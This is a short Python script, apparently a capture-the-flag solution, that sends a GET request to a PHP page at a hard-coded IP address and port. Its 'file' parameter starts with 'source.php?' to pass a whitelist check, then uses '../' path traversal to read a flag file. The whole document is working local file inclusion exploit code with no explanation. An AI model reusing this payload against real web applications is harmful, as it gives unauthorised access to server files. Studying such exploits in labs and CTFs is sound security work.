import requests

url = "http://124.16.75.117:51005/index.php"
params = {"file": "source.php?/../../../../ffffllllaaaagggg"}

response = requests.get(url, params=params)
print(response.text)